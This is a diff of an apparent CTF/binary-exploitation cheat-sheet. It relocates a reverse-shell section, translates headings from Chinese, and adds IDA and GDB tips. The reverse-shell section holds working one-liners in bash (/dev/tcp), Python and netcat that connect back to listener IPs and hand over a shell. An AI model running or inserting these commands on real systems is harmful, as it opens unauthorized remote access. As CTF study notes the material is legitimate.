@@ -9,6 +9,27 @@ Updating
 <!--more-->
 
 ## Start
+## reversed shell
+system:
+```bash
+# system(cmd),cmd=
+/bin/bash -c 'bash -i >/dev/tcp/192.168.74.132/4444 0>&1'
+bash -c 'exec bash -i &>/dev/tcp/<ip address>/<port> <&1';
+```
+
+python:
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+netcat:
+```bash
+nc 192.168.1.1 4444 | /bin/bash | nc 192.168.1.1 5555
+```
+
+## Connection Check
+1. When you can run any command, Use sleep to hang the shell.
+2. Try p.read(even there is no responding data)
 
 ## Python Figures 
 
@@ -138,7 +159,7 @@ IDA patch 掉 alarm,system("sleep ?")
 #patch之前改一下option->general->opcode
 用IDA->edit->patch program->change ...->apply
 
-## IDA_快捷键
+## IDA Shortcut
   rename====>n
   undef=====>u
   xref======>x
@@ -146,24 +167,8 @@ IDA patch 掉 alarm,system("sleep ?")
   def=======>y
   search string=>option+t
   change sp==>option+k
-## GDB 查看结构体大小
+## GDB sizeof
 p sizeof(_IO_FILE)
-
-## 反弹shell
-[各种环境下反弹shell][2]
-```sh
-/bin/bash -c 'bash -i >/dev/tcp/192.168.74.132/4444 0>&1'
-```
-
-```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-```bash
-nc 192.168.1.1 4444 | /bin/bash | nc 192.168.1.1 5555
-#感觉好机智... 将4444端口传入的东西给sh执行后将结果传给5555端口
-```
-
 
 
 ## fmt_leak
